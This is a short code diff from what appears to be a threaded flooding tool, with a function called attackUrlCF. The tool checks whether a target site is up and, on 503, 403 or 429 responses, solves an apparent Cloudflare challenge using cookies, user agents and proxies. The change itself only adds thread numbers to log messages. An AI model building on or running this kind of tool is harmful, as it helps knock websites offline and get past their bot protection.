@@ -114,13 +114,13 @@ def attackUrlCF(baseUrl, threadNumber):
 			if isClear:
 				print('threadNum: ' + str(threadNumber), 'up.....')
 			else:
-				print('down!!!!!')
+				print(str(threadNumber), 'down!!!!!')
 			# print('threadNum: ' + str(threadNumber))
 			# print(res[0].content)
 			if str(res[0].status_code) in ['503', '403', '429']:
-				print('resolsing chalennge')
+				print(str(threadNumber), 'resolsing chalennge')
 				cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
-				print('resolved')
+				print(str(threadNumber), 'resolved')
 			
 			# input()
 		except Exception as err:
